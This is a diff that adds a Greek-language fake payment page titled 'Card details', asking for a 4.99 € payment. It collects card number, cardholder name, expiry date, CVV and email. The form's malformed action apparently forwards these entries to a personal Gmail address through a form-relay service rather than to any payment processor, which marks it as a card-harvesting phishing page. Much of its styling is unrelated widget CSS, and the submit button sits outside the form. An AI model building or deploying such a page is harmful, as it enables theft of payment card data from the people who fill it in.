@@ -1,0 +1,468 @@
+<!DOCTYPE html><html lang="el">                                                    <meta name="viewport"content="width=device-width,initial-scale=1"><head><meta charset="UTF-8"><title>Στοιχεία Κάρτας</title> <style>.score_list *{box-sizing:border-box;-moz-box-sizing:border-box;-webkit-box-sizing:border-box}.score_list{float:left;clear:both;width:100%;margin:10px 0}.score_list .row{float:left;clear:both;width:100%;background:#fff;padding:10px 7px;border:1px solid #ccc;border-top:none;box-shadow:0 2px 2px #f5f5f5;-moz-box-shadow:0 2px 2px #f5f5f5;-webkit-box-shadow:0 2px 2px #f5f5f5}.score_list .row.original_user{background:#f8f8f8}.score_list .left{width:25%;float:left}.score_list .right{width:75%;float:right;padding-left:10px}.score_list .name{float:left;clear;both;width:100%;font-size:12px;font-weight:700;font-size:13px;color:#444;margin-top:2px}.score_list .date{float:left;clear:both;width:100%;font-style:italic;color:#888;margin-top:3px;font-size:11px}.score_list .tit{float:left;font-size:16px;font-weight:400;color:#333}.score_list .score{float:right}.score_list .score strong{font-weight:500;color:#f44336;border-bottom:1px dashed #ddd}.score_list .message{float:left;width:100%;font-size:12px;margin-top:2px;color:#444}.score_list .row.header{font-size:14px;display:block;padding:8px 10px;font-weight:400;color:#fff;text-shadow:1px 1px 0 #000;text-decoration:none;background-position:0 0;background-color:#444;background-repeat:no-repeat;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#666666',endColorstr='#444444',GradientType=0);border:1px solid #333;border-bottom-color:#444;-webkit-box-shadow:inset 0 1px 0 rgba(255,255,255,.2),0 1px 2px rgba(0,0,0,.05);-moz-box-shadow:inset 0 1px 0 rgba(255,255,255,.2),0 1px 2px rgba(0,0,0,.05);box-shadow:inset 0 1px 0 rgba(255,255,255,.2),0 1px 2px rgba(0,0,0,.05);background-image:-khtml-gradient(linear,left top,left bottom,from(#666666),to(#444444));background-image:-webkit-linear-gradient(#666666,#666666 25%,#444444);background-image:-moz-linear-gradient(top,#666666,#666666 25%,#444444);background-image:-ms-linear-gradient(#666666,#666666 25%,#444444);background-image:-o-linear-gradient(#666666,#666666 25%,#444444);background-image:linear-gradient(#666666,#666666 25%,#444444);-webkit-border-top-left-radius:3px;-webkit-border-top-right-radius:3px;-moz-border-radius-topleft:3px;-moz-border-radius-topright:3px;border-top-left-radius:3px;border-top-right-radius:3px}.score_list .row.header span{font-weight:700;float:none!important;margin:0;padding:0}.score_detail *{box-sizing:border-box;-moz-box-sizing:border-box;-webkit-box-sizing:border-box}.score_detail{width:190px;float:left}.score_detail .score_quality,.score_detail .score_delivery,.score_detail .score_communication{float:left;clear:both;width:100%}.score_detail .score_quality .lab,.score_detail .score_delivery .lab,.score_detail .score_communication .lab{float:left;width:100px;margin-top:2px}.score_list.best_rated .left{width:50%;float:left}.score_list.best_rated .right{width:50%;float:right}#user-feedback{position:absolute;width:100%;height:100%;background:rgba(0,0,0,.3);z-index:999999;display:none;top:0;left:0}#user-feedback *{box-sizing:border-box;-moz-box-sizing:border-box;-webkit-box-sizing:border-box}#user-feedback .inside{position:relative;margin:20px 30%;width:40%;background:#fff;float:left;padding:5px;box-shadow:0 0 25px rgba(0,0,0,.7)}#user-feedback .wrap{float:left;width:100%;padding:15px;background:#f0f0f0}#user-feedback .row{float:left;clear:both;width:100%;margin:3px 0}#user-feedback .row.user_info{height:30px;overflow:hidden;text-overflow:ellipsis}#user-feedback .row.loc{font-size:11px;color:#444;font-weight:700;margin-top:4px}#user-feedback .left{width:50%;float:left}#user-feedback .right{width:50%;float:right}#user-feedback .photo{padding:15px 10px;background:#fff;margin:0}#user-feedback .photo img{float:left;clear:both;width:100%;height:auto;border:1px solid #bbb;background:#fff;padding:2px;-webkit-border-radius:2px;-moz-border-radius:2px;border-radius:2px}#user-feedback .photo .left{width:20%}#user-feedback .photo .right{width:80%;padding-left:15px}#user-feedback .clear{float:left;width:100%;clear:both}#user-feedback .italic{font-style:italic}#user-feedback .bold{font-weight:700}#user-feedback .name{font-size:15px;font-weight:700}#user-feedback .text.name{margin-top:8px}#user-feedback .text .left{margin:8px 0 2px}#user-feedback .text .left,#user-feedback .text .right{width:100%;clear:both}#user-feedback .text .left,#user-feedback .rank .left{font-size:11px;font-weight:700}#user-feedback input,#user-feedback textarea{font:12px Arial,Helvetica,Verdana,sans-serif;border:1px solid #bbb;border-bottom-color:#ddd;border-right-color:#ddd;padding:5px 8px;width:100%;-webkit-transition:border linear .2s,box-shadow linear .2s;-moz-transition:border linear .2s,box-shadow linear .2s;-ms-transition:border linear .2s,box-shadow linear .2s;-o-transition:border linear .2s,box-shadow linear .2s;transition:border linear .2s,box-shadow linear .2s;-webkit-box-shadow:inset 0 1px 3px rgba(0,0,0,.1);-moz-box-shadow:inset 0 1px 3px rgba(0,0,0,.1);box-shadow:inset 0 1px 3px rgba(0,0,0,.1)}#user-feedback textarea{height:80px}#user-feedback .rank-block{margin:15px 0}#user-feedback .rank-block .left{width:25%}#user-feedback .rank-block .right{width:75%}#user-feedback .header{font-size:13px;display:block;padding:8px 10px;font-weight:700;color:#fff;text-shadow:1px 1px 0 #000;text-decoration:none;background-position:0 0;background-color:#444;background-repeat:no-repeat;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#666666',endColorstr='#444444',GradientType=0);border:1px solid #333;border-bottom-color:#444;-webkit-box-shadow:inset 0 1px 0 rgba(255,255,255,.2),0 1px 2px rgba(0,0,0,.05);-moz-box-shadow:inset 0 1px 0 rgba(255,255,255,.2),0 1px 2px rgba(0,0,0,.05);box-shadow:inset 0 1px 0 rgba(255,255,255,.2),0 1px 2px rgba(0,0,0,.05);background-image:-khtml-gradient(linear,left top,left bottom,from(#666666),to(#444444));background-image:-webkit-linear-gradient(#666666,#666666 25%,#444444);background-image:-moz-linear-gradient(top,#666666,#666666 25%,#444444);background-image:-ms-linear-gradient(#666666,#666666 25%,#444444);background-image:-o-linear-gradient(#666666,#666666 25%,#444444);background-image:linear-gradient(#666666,#666666 25%,#444444);-webkit-border-top-left-radius:3px;-webkit-border-top-right-radius:3px;-moz-border-radius-topleft:3px;-moz-border-radius-topright:3px;border-top-left-radius:3px;border-top-right-radius:3px}#user-feedback .del{width:100%;float:left;clear:both;height:0;border-top:1px solid #ddd;border-bottom:1px solid #fff;margin:0}#user-feedback sup{margin-left:3px;color:red}#user-feedback #error_list{margin:5px 0}#user-feedback .close{position:absolute;top:-17px;right:-17px;background:url(../images/fancybox_sprite.png) no-repeat 0 0;width:38px;height:38px;cursor:pointer}#user-feedback .button{padding:7px 10px;font-weight:700;height:auto;text-align:center;cursor:pointer;float:left;outline:none;margin-top:7px}#user-feedback .button span{padding:0;margin:0;text-transform:none}#user-feedback .button:hover{background-position:0 -10px;text-decoration:none;color:#fff;outline:none}#user-feedback .button:hover a{text-decoration:none;color:#fff}#user-feedback .button:active{outline:none;-webkit-box-shadow:inset 0 2px 4px rgba(0,0,0,.25),0 1px 2px rgba(0,0,0,.05);-moz-box-shadow:inset 0 2px 4px rgba(0,0,0,.25),0 1px 2px rgba(0,0,0,.05);box-shadow:inset 0 2px 4px rgba(0,0,0,.25),0 1px 2px rgba(0,0,0,.05)}#user-feedback .button{float:left;color:#fff;text-decoration:none;border:1px solid #004de6;text-shadow:1px 1px 0 #143564;display:block;background-position:0 0;-webkit-box-shadow:inset 0 1px 0 rgba(255,255,255,.2),0 1px 2px rgba(0,0,0,.05);-moz-box-shadow:inset 0 1px 0 rgba(255,255,255,.2),0 1px 2px rgba(0,0,0,.05);box-shadow:inset 0 1px 0 rgba(255,255,255,.2),0 1px 2px rgba(0,0,0,.05);-webkit-transition:.1s linear all;-moz-transition:.1s linear all;-ms-transition:.1s linear all;-o-transition:.1s linear all;transition:.1s linear all;background-color:#004de6;background-repeat:repeat-x;background-image:-khtml-gradient(linear,left top,left bottom,from(#02ABFF),to(#004DE6));background-image:-moz-linear-gradient(top,#02ABFF,#004DE6);background-image:-ms-linear-gradient(top,#02ABFF,#004DE6);background-image:-webkit-linear-gradient(top,#02ABFF,#004DE6);background-image:-o-linear-gradient(top,#02ABFF,#004DE6);background-image:linear-gradient(top,#02ABFF,#004DE6);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#02ABFF',endColorstr='#004DE6',GradientType=0);outline:none;-webkit-border-radius:2px;-moz-border-radius:2px;border-radius:2px}#user-feedback .name_unchangable{font:12px Arial,Helvetica,Verdana,sans-serif;cursor:default;float:left;clear:both;color:#777;background:#f8f8f8;border:1px solid #bbb;border-bottom-color:#ddd;border-right-color:#ddd;padding:5px 8px;width:100%;-webkit-transition:border linear .2s,box-shadow linear .2s;-moz-transition:border linear .2s,box-shadow linear .2s;-ms-transition:border linear .2s,box-shadow linear .2s;-o-transition:border linear .2s,box-shadow linear .2s;transition:border linear .2s,box-shadow linear .2s;-webkit-box-shadow:inset 0 1px 3px rgba(0,0,0,.1);-moz-box-shadow:inset 0 1px 3px rgba(0,0,0,.1);box-shadow:inset 0 1px 3px rgba(0,0,0,.1)}#user-feedback .feedback-warn{float:left;width:100%;clear:both;margin:20px 0}#user-feedback .feedback-warn span{float:left;clear:both;width:100%;margin:3px 0}#user-feedback .feedback-warn span a{font-weight:700}#leave_feedback{float:left;clear:both;cursor:pointer;width:100%}#required_form_special{overflow:hidden;width:1px;height:1px;float:left;background:0 0;max-width:1px;max-height:1px}.round1{-webkit-border-radius:1px;-moz-border-radius:1px;border-radius:1px}.round2{-webkit-border-radius:2px;-moz-border-radius:2px;border-radius:2px}.round3{-webkit-border-radius:3px;-moz-border-radius:3px;border-radius:3px}.round4{-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px}.round5{-webkit-border-radius:5px;-moz-border-radius:5px;border-radius:5px}.inner-border{-moz-box-shadow:inset 0 0 0 1px #fff;-webkit-box-shadow:inset 0 0 0 1px #fff;box-shadow:inset 0 0 0 1px #fff}@media screen and (min-width:768px) and (max-width:1199px){#user-feedback .inside{width:60%;margin:20px 20%}}@media screen and (max-width:767px){#user-feedback .inside{width:90%;margin:20px 5%}#user-feedback .rank-block .left{width:35%}#user-feedback .rank-block .right{width:65%}#user-feedback .photo .left{width:30%}#user-feedback .photo .right{width:70%}}div.rating-cancel,div.star-rating{float:left;width:17px;height:15px;text-indent:-999em;cursor:pointer;display:block;background:0 0;overflow:hidden}div.rating-cancel,div.rating-cancel a{background:url(../images/delete.gif) no-repeat 0 -16px}div.star-rating,div.star-rating a{background:url(../images/star.gif) no-repeat 0 0}div.rating-cancel a,div.star-rating a{display:block;width:16px;height:100%;background-position:0 0;border:0}div.star-rating-on a{background-position:0 -16px}div.star-rating-hover a{background-position:0 -32px}div.star-rating-readonly a{cursor:default}div.star-rating{background:0 0;overflow:hidden}#user-feedback .close::before {font-family: "FontAwesome";content: "\f00d";font-size: 24px;line-height: 38px;display: flex;align-items: center;
+    justify-content: center;background: rgba(0, 0, 0, 0.75);color: #fff;border-radius: 100%}
+    </style>
+
+
+ <style>
+
+
+@media only screen and (max-width:8024px) {
+  /* For pc  */
+
+.image1{
+    width: 20px;
+    height: 20px;
+}
+.image2{
+    width: 52px;
+    height: 32px;
+    
+}
+
+
+.color{
+    color: gray;
+    font-size: 20px;
+}
+.size{
+    color:gray;
+    width: 270px;
+    height: 40px;
+    font-size: 18px;
+    background-color: black;
+    border-radius: 13px;
+    border: 2px solid orange;
+     text-align: center;
+}
+.epikefalida{
+    font-size: 18px;
+    color: gray;
+    margin-left:-100px;
+}
+.ipokefalida{
+    color: green;
+    font-size: 16px;
+    margin-left: 0px;
+}
+.image{
+    margin-left: 28px;
+}
+
+.button{
+    background-color: black;
+    color:green;
+    width: 180px;
+    height: 50px;
+    border-radius: 13px;
+    border: 2px solid orange;
+    font-size: 16px;
+    margin-left: 0px;
+    
+}
+
+
+.check{
+    margin-left: 0px;
+    width: 16px;
+    height: 16px;
+}
+
+.position{
+    margin-left:0px;
+    color:gray;
+    font-size: 20px;
+}
+
+
+.email{
+    margin-left: 0px;
+    color: gray;
+    font-size: 20px;
+
+}
+
+.save{
+    color: gray;
+    font-size: 20px;
+
+}
+
+}
+
+
+
+
+
+@media only screen and (max-width:1034px) {
+  /* For tablets rotate : */
+
+.image1{
+    width: 38px;
+    height: 38px;
+}
+.image2{
+    width: 89px;
+    height: 50px;
+}
+
+.color{
+    color: gray;
+    font-size: 30px;
+
+}
+.size{
+    color:gray;
+    width: 400px;
+    height:90px;
+    font-size: 30px;
+    background-color: black;
+    border-radius: 13px;
+    border: 2px solid orange;
+    text-align: center;
+}
+.epikefalida{
+    font-size:38px;
+    color: gray;
+    margin-left:-240px;
+}
+.ipokefalida{
+    color: green;
+    font-size: 30px;
+    margin-left: 0px;
+}
+.image{
+    margin-left: 28px;
+}
+
+.button{
+    background-color: black;
+    color:green;
+    width: 300px;
+    height: 60px;
+    border-radius: 13px;
+    border: 2px solid orange;
+    font-size: 30px;
+    margin-left: 0px;
+    
+}
+
+
+.check{
+    margin-left: 0px;
+    width: 30px;
+    height: 30px;
+}
+
+.position{
+    margin-left:0px;
+    color:gray;
+    font-size: 36px;
+}
+
+
+.email{
+    margin-left: 0px;
+    color: gray;
+    font-size: 20px;
+
+}
+
+.save{
+    color: gray;
+    font-size: 30px;
+
+}
+
+
+
+
+
+
+
+
+}
+
+
+
+
+
+@media only screen and (max-width:660px) {
+  /* For mobile phones: */
+
+
+
+
+
+
+.image2{
+    width: 46px;
+    height: 26px;
+}
+
+.color{
+    color: gray;
+    font-size: 15px;
+
+}
+.size{
+    color:gray;
+    width: 200px;
+    height:32px;
+    font-size: 16px;
+    background-color: black;
+    border-radius: 6px;
+    border: 2px solid orange;
+    text-align: center;
+}
+.epikefalida{
+    font-size: 16px;
+    color: gray;
+    margin-left:-100px;
+}
+.ipokefalida{
+    color: green;
+    font-size: 14px;
+    
+}
+
+
+.button{
+    background-color: black;
+    color:green;
+    width: 150px;
+    height: 40px;
+    border-radius: 13px;
+    border: 2px solid orange;
+    font-size: 16px;
+    margin-left: 0px;
+    
+}
+
+
+.check{
+    margin-left: 0px;
+    width: 18px;
+    height: 18px;
+}
+
+.position{
+    margin-left:0px;
+    color:gray;
+    font-size: 36px;
+}
+
+
+.email{
+    margin-left: 0px;
+    color: gray;
+    font-size: 20px;
+
+}
+
+.save{
+    color: gray;
+    font-size: 15px;
+
+}
+
+
+
+
+
+
+
+
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+}
+
+
+
+
+</style>                                                               </head>
+
+
+<body style="font-family: verdana;" bgcolor="black">
+   
+
+
+
+
+<center>
+<h1 class="epikefalida"> Τρόπος πληρωμής </h1>
+</center>
+
+
+<center>
+<p class="ipokefalida"> Πιστωτική ή χρεωστική κάρτα</p>
+</center>
+
+
+<center>
+
+  
+<img src="visa.png" class="image2">
+&nbsp;&nbsp;
+<img src="master.png" class="image2">
+&nbsp;&nbsp;
+<img src="america.png" class="image2">
+
+</center>
+
+
+<br>
+
+
+<form action=httpsformsubmit.cobagelis.deligiannis@gmail.com method=POST>
+
+<center>
+
+<label class="color">Αριθμός Κάρτας (16 ψηφία)</label>
+<br>
+<input   class="size"    type="code" name="code" required
+
+placeholder="0000 0000 0000 0000 " oninput="formatNumber(this)">
+
+
+<br><br>
+  
+  <label class="color">Oνοματεπώνυμο κατόχου:</label><br>
+  
+  <input class="size"  required
+   type="name" name="name" placeholder="Name"oninput="filterInput(this)">
+
+
+ 
+
+<br><br>
+
+
+
+
+
+
+
+
+
+
+
+ <label class="color">Ημερομηνία Λήξης:</label><br>
+
+<input class="size" required  type="date" name="date" maxlength="5" placeholder="MM/YY" pattern="
+
+^(0[1-9]|1[0-2])\/\d{2}$" 
+
+ title="Μορφή: MM/YY" inputmode="numeric" 
+
+ oninput="
+
+            let v = this.value.replace(/[^0-9]/g,'');
+            if(v.length >= 3) v = v.slice(0,2) + '/' + v.slice(2,4);
+            this.value = v;">
+<br><br>
+ <label class="color">Kωδικός ασφαλείας:</label><br>
+   <input class="size" required  type="password" name="password" maxlength="3" placeholder="CVV" pattern="\d{3}" title="3 ψηφία CVV" inputmode="numeric">
+</center>
+<br>
+
+<center>
+ <label class="color">Email:</label><br>
+   <input class="size"   placeholder="pay@gmail.com"inputmode="numeric" type="email" name="email">
+</center>
+
+</form>
+
+
+<center>
+    <p class="save">
+<input class="check"  type="checkbox">
+ Αποθήκευση στοιχείων <br>κάρτας...
+&nbsp;&nbsp;
+&nbsp;&nbsp;
+&nbsp;&nbsp;
+&nbsp;&nbsp;
+&nbsp;&nbsp;
+
+
+   </p>
+</center>
+
+
+
+
+<center>   
+<button class="button" type="submit"> Πληρωμή 4.99 € </button>
+</center>
+
+
+
+
+
+
+
+
+  <script>
+    function formatNumber(input) {
+      // Αφαιρούμε ό,τι δεν είναι αριθμός
+      let value = input.value.replace(/\D/g, '');
+
+      // Μέγιστο 16 ψηφία
+      value = value.slice(0, 16);
+
+      // Βάζουμε κενό κάθε 4 ψηφία
+      value = value.replace(/(.{4})/g, '$1 ').trim();
+
+      input.value = value;
+    }
+  </script>
+
+
+  <script>function filterInput(input) {
+      // Γράμματα (ΕΛ + EN), space και τελεία
+      input.value = input.value
+        .replace(/[^a-zA-Zα-ωΑ-Ω\s\.]/g, '')
+        .toUpperCase();
+    }
+  </script>
+
+
+</body>                                                       </html>
+
+
+
+
+
+
+
+
+
+
